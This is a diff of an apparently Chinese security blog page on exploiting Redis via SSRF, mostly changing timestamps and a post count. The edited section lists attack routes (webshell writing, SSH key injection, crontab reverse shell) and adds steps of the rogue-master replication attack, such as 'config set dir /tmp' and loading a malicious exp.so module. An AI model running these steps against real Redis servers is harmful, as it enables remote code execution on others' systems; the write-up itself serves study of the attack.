@@ -30,7 +30,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/04/17/SSRF-Redis/SSRF-Redis-1.png">
 <meta property="og:image" content="http://yoursite.com/2020/04/17/SSRF-Redis/SSRF-Redis-2.png">
 <meta property="article:published_time" content="2020-04-17T12:20:24.000Z">
-<meta property="article:modified_time" content="2020-05-09T00:58:55.459Z">
+<meta property="article:modified_time" content="2020-05-22T01:07:36.735Z">
 <meta property="article:author" content="ananaskr">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://yoursite.com/2020/04/17/SSRF-Redis/SSRF-Redis-1.png">
@@ -193,7 +193,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-05-09 08:58:55" itemprop="dateModified" datetime="2020-05-09T08:58:55+08:00">2020-05-09</time>
+                <time title="Modified: 2020-05-22 09:07:36" itemprop="dateModified" datetime="2020-05-22T09:07:36+08:00">2020-05-22</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -224,7 +224,7 @@
 <li><strong>绝对路径写Webshell</strong></li>
 <li><strong>写入ssh公钥</strong></li>
 <li><strong>写crontab计划任务反弹shell(针对CentOS)</strong></li>
-<li><strong>主从复制(4.0 &lt; Redis &lt; 5.0.5)</strong> </li>
+<li><strong>主从复制(4.0 &lt; Redis)</strong> </li>
 </ul>
 <p>这篇文章通过实验依次介绍几种方法的使用以及一些脚本，脚本以及此次实验的环境都放在了<a href="https://github.com/ananaskr/Escalation_Database/tree/master/Redis" target="_blank" rel="noopener">github</a>。</p>
 <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>首先介绍一下Redis以及此次实验的相关配置。</p>
@@ -301,8 +301,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof ip port</span><br></pre></td></tr></table></figure>
 
 <p>2）<strong>设置redis的数据库文件</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename exp.so</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;tmp</span><br><span class="line">config set dbfilename exp.so</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在这里最好将当前目录设置为/tmp目录这样的，提高容错率。</p>
+</blockquote>
 <p>3) <strong>从master接收module</strong><br>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，实现新的Redis命令。Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。恶意的so文件可参考<a href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK" target="_blank" rel="noopener">RedisModulesSDK</a>  </p>
 <p>在这个过程当中，利用全量复制将master上的RDB文件同步到slave上，从而加载恶意so文件达到RCE的目的。因此，需要以master的身份向slave传输so文件，在弄清楚他们之间流程后，便可伪造一个假的redis服务器。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">master   &lt;------ PING  &lt;-----    slave</span><br><span class="line">master   ------&gt; +PONG -----&gt;    slave</span><br><span class="line">master   &lt;--- REPLCONF &lt;-----    slave</span><br><span class="line">master   -------&gt; +OK  -----&gt;    slave</span><br><span class="line">master   &lt;--- REPLCONF &lt;-----    slave</span><br><span class="line">master   -------&gt; +OK  -----&gt;    slave</span><br><span class="line">master   &lt;------ PSYNC &lt;-----    slave</span><br></pre></td></tr></table></figure>
@@ -418,7 +420,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-count">30</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
